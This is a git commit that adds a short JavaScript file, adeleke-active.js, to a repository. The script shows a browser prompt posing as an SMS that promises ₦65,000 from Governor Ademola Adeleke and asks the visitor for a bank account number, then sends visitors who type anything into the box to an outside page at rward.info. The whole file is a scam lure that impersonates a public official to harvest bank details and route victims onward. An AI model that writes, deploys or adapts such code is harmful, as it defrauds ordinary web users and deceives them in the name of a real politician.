76f8dd70e7f19b1792e30460ab510faba2b429c0
rmadamgspec <g5mqnsm8zn@privaterelay.appleid.com>
2026-05-10 11:14:28 +0100

    Create adeleke-active.js

---
+++ adeleke-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦65,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦65,000 From Gov Ademola Adeleke, click OK to Enter Your Acc. Number','WITHDRAW ₦65,000');
+if (password != 'WITHDRAW ₦65,000') {
+location.href='http://rward.info/Adeleke-birthday.html';
+}
